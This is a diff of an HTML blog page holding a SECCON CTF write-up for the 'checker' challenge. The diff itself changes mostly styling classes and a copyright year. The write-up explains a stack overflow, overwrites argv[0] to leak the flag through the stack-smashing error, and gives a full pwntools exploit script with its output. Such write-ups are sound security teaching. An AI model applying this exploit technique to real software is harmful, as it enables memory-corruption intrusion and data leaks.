@@ -307,7 +307,7 @@
 <p>64 bit ELF with Full RELRO, stack canary, NX enabled, No PIE.</p>
 
 <p>A quick run of the program:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./checker 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./checker 
 Hello! What is your name?
 NAME : 123
 
@@ -323,17 +323,17 @@ FLAG : asdf
 You are a liar...
 </code></pre></div></div>
 
-<p>By reversing the binary, we found that the program use a function named <code class="highlighter-rouge">getaline()</code> to read the user input.</p>
+<p>By reversing the binary, we found that the program use a function named <code class="language-plaintext highlighter-rouge">getaline()</code> to read the user input.</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span> <span class="p">(</span> <span class="n">buf</span> <span class="o">&amp;&amp;</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">)</span> <span class="p">)</span>
 <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span> <span class="n">buf</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
         <span class="n">buf</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v4</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// a1 = input buffer
-</span><span class="p">}</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v4</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// a1 = input buffer</span>
+<span class="p">}</span>
 </code></pre></div></div>
-<p>We can see that the <code class="highlighter-rouge">getaline()</code> function is just like <code class="highlighter-rouge">gets()</code> in <code class="highlighter-rouge">stdio.h</code>, so the program itself has multiple stack overflow vulnerabilities.</p>
+<p>We can see that the <code class="language-plaintext highlighter-rouge">getaline()</code> function is just like <code class="language-plaintext highlighter-rouge">gets()</code> in <code class="language-plaintext highlighter-rouge">stdio.h</code>, so the program itself has multiple stack overflow vulnerabilities.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./checker
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./checker
 Hello! What is your name?
 NAME : 123
 
@@ -348,13 +348,13 @@ You are a liar...
 [1]    70548 abort      ./checker
 </code></pre></div></div>
 
-<p>Although we can easily overwrite the return address, however the program has the stack smashing protector (SSP) enabled. Luckliy, the program will read the flag’s content and stored it into a buffer which lies in the <code class="highlighter-rouge">.bss</code> section before entering the main function. So, we can try to <strong>overwrite the content of <code class="highlighter-rouge">argv[0]</code> ( which stores a <code class="highlighter-rouge">char*</code> pointer of the program file path ) into the flag buffer’s address</strong>. Then, we smash the stack and trigger the SSP, which will then output the following error message:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*** stack smashing detected ***: [flag content] terminated
+<p>Although we can easily overwrite the return address, however the program has the stack smashing protector (SSP) enabled. Luckliy, the program will read the flag’s content and stored it into a buffer which lies in the <code class="language-plaintext highlighter-rouge">.bss</code> section before entering the main function. So, we can try to <strong>overwrite the content of <code class="language-plaintext highlighter-rouge">argv[0]</code> ( which stores a <code class="language-plaintext highlighter-rouge">char*</code> pointer of the program file path ) into the flag buffer’s address</strong>. Then, we smash the stack and trigger the SSP, which will then output the following error message:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*** stack smashing detected ***: [flag content] terminated
 </code></pre></div></div>
 
-<p>Notice that the original content of <code class="highlighter-rouge">argv[0]</code> stores a 6 bytes memory address, while the flag’s buffer address is 3 bytes (<code class="highlighter-rouge">0x6010c0</code>). So we’ll have to null out the <code class="highlighter-rouge">argv[0]</code> first before we change it into <code class="highlighter-rouge">0x6010c0</code>, or else it will crash the program before it was able to output the error message.</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<p>Notice that the original content of <code class="language-plaintext highlighter-rouge">argv[0]</code> stores a 6 bytes memory address, while the flag’s buffer address is 3 bytes (<code class="language-plaintext highlighter-rouge">0x6010c0</code>). So we’ll have to null out the <code class="language-plaintext highlighter-rouge">argv[0]</code> first before we change it into <code class="language-plaintext highlighter-rouge">0x6010c0</code>, or else it will crash the program before it was able to output the error message.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 <span class="kn">import</span> <span class="nn">sys</span>
@@ -365,17 +365,17 @@ You are a liar...
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./checker"</span>
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
 
-<span class="c"># setting </span>
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="c1"># setting 
+</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
-<span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
+<span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
+</span><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
-<span class="c">#libc = ELF(LIBC_PATH)</span>
-
+<span class="c1">#libc = ELF(LIBC_PATH)
+</span>
 <span class="k">def</span> <span class="nf">my_recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">delim</span><span class="p">):</span>
     <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
     <span class="k">while</span> <span class="n">delim</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
@@ -392,21 +392,21 @@ You are a liar...
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
     <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
-    <span class="c">#r = process(ELF_PATH)</span>
-
+    <span class="c1">#r = process(ELF_PATH)
+</span>
     <span class="n">pad</span> <span class="o">=</span> <span class="mh">0x178</span>
 
     <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="s">"aaaa"</span><span class="p">)</span>
     
-    <span class="c"># null out argv[0]</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+    <span class="c1"># null out argv[0]
+</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
         <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="n">pad</span> <span class="o">+</span> <span class="s">"B"</span><span class="o">*</span><span class="n">i</span>
         <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
     
     <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="s">"yes"</span><span class="p">)</span>
 
-    <span class="c"># overwrite argv[0] to flag buffer</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="n">pad</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6010c0</span><span class="p">)</span>
+    <span class="c1"># overwrite argv[0] to flag buffer
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="n">pad</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6010c0</span><span class="p">)</span>
     
     <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
@@ -416,7 +416,7 @@ You are a liar...
 <p>Although the exploit works on the local machine, it failed to work on the remote side. I sent the payload for like a hundred times and it just won’t give me the flag. It really frustrated me at that moment because I was so close to capture the flag and the contest is about to end in 5 minutes……</p>
 
 <p>But there’s nothing more I can do, so I just keep sending the same payload again and again, hoping that  it will work at the end of the contest. And then, something amazing happened…</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Opening connection to checker.pwn.seccon.jp on port 14726: Done
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Opening connection to checker.pwn.seccon.jp on port 14726: Done
 You are a liar...
 *** stack smashing detected ***: SECCON{y0u_c4n'7_g37_4_5h3ll,H4h4h4} terminated
 [*] Got EOF while reading in interactive
@@ -426,7 +426,7 @@ You are a liar...
 
 <p>I still don’t know why it will work at the very end of the contest until now ! I mean it’s the same payload ! How is this even possible ? Anyway I managed to submit the flag right before the end of the contest and get the damn 300 points … What an end @_@!</p>
 
-<p>flag: <code class="highlighter-rouge">SECCON{y0u_c4n'7_g37_4_5h3ll,H4h4h4}</code></p>
+<p>flag: <code class="language-plaintext highlighter-rouge">SECCON{y0u_c4n'7_g37_4_5h3ll,H4h4h4}</code></p>
 
         
       </section>
@@ -531,7 +531,6 @@ You are a liar...
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -551,7 +550,6 @@ You are a liar...
 
         
           
-          
 
 
 
@@ -570,7 +568,6 @@ You are a liar...
 </div>
 
         
-          
           
 
 
@@ -593,7 +590,6 @@ You are a liar...
 
         
           
-          
 
 
 
@@ -614,6 +610,7 @@ You are a liar...
         
       </div>
     </div>
+  
   
 </div>
 
@@ -664,7 +661,7 @@ You are a liar...
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
